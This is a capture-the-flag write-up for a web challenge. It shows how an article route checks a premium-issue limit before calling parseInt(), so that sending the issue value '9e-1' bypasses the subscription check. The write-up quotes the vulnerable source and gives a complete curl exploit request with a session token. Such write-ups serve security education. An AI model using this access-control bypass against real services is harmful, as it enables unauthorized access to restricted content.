> Come read our newspaper! Be sure to subscribe if you want access to the entire catalogue, including the latest issue.
> 
> Author: SteakEnthusiast
> 
> `uoftctf-the-varsity.chals.io`

We are given a login screen with a username, and the option to also input a voucher code. Once we login with an arbitrary username, we can access a library of 9 articles, however the 9th is restricted to "premium" members. This 9th article contains the flag.

Looking at the provided source code, there looks to be a robust login system in place, however, one function looks strange, the route to access an article:

```
app.post("/article", (req, res) => {
  const token = req.cookies.token;
  if (token) {
    try {
      const decoded = jwt.verify(token, JWT_SECRET);
      let issue = req.body.issue;
      if (req.body.issue < 0) {
        return res.status(400).json({ message: "Invalid issue number" });
      }
      if (decoded.subscription !== "premium" && issue >= 9) {
        return res
          .status(403).json({ message: "Please subscribe to access this issue" })
      }
      issue = parseInt(issue);
      if (Number.isNaN(issue) || issue > articles.length - 1) {
        return res.status(400).json({ message: "Invalid issue number" });
      }
      return res.json(articles[issue]);
    } catch (error) {
      res.clearCookie("token");
      return res.status(403).json({ message: "Not Authenticated" });
    }
  } else {
    return res.status(403).json({ message: "Not Authenticated" });
  }
});
```

The function checks if the `issue` var is greater or equal to 9 before it converts it to an Integer with parseInt. Doing some research reveals this article: https://dev.to/darkmavis1980/you-should-stop-using-parseint-nbf. Specifically, the difference between how Number() and parseInt() handle scientific numbers, where Number('9e-1') would be 0.9, but parseInt('9e-1') would be 9. 

Therefore, if we set `issue` to "9e-1", we should pass the check, and still access the 9th article. 

Using the following command: 

`curl 'https://uoftctf-the-varsity.chals.io/article'   -H 'Connection: keep-alive'   -H 'Content-Type: application/json'   -H 'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMzQiLCJzdWJzY3JpcHRpb24iOiJndWVzdCIsImlhdCI6MTcwNTIwMjk5MCwiZXhwIjoxNzA1Mjg5MzkwfQ.PpC0qOTtOwTO_K9H8zyR_MEBD7xPYjFbGB-b-HN7uiI'     --data-raw '{"issue": "9e-1"}'   --compressed`

We get the flag: uoftctf{w31rd_b3h4v10r_0f_parseInt()!}